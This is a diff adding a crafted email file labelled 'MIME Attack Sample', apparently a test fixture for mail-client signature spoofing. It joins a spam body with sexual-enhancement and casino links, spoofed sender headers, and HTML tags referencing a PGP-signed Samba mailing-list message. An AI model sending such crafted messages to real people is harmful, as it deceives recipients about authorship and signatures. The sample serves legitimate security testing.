@@ -1,0 +1,81 @@
+From: brian_schofield@mckinsey.com
+To: s..fastow@enron.com, rick.buy@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain; charset=us-ascii
+X-Mailer: Mutt 1.0.1i
+Subject: Re:
+Status: O
+Content-Length: 608
+Lines: 21
+
+
+Have you ever wished you ejaculate like a porn star?
+Now you can.. http://thonr.com
+
+Did you ejaculate before or within a few minutes of 
+penetration? Help is here... http://uacor.com
+
+Wish you could rock her world all night long? Now you
+can.. http://amzap.com
+
+Add some inches fast, safe and effective as seen on
+NBC and prooven to work 100% ... http://abfao.com
+
+If a relaxing moment turns into the right moment, 
+will you be ready? http://minjkirrreat.com/
+
+
+-----------------------------
+
+PS, This crazy casino gives you money to play and best 
+of all you get to keep it.. http://mergruta.com/micro/7/
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Volker,
+
+> Author: vlendec
+> Date: 2007-05-12 19:53:47 +0000 (Sat, 12 May 2007)
+> New Revision: 22819
+> 
+> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=22819
+> 
+> Log:
+> Fix Bug 4613. We just dumped the must change & friends. With the
+> pass_last_changed == 0 we now return "Change now!" instead of "Change
+> never"
+
+This looks safe to me.    How confident are you in it for inclusion in
+Monday's release (considering all the cases/configurations that this
+code path could be called from)?
+
+
+
+
+
+cheers, jerry
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGRhztIR7qMdg1EfYRAqufAKDBlD+twm8l0QusLsAvXfL23kHo4QCgwP+f
+JAA7FPgr/gXLmmFqPbKjShM=
+=17h1
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
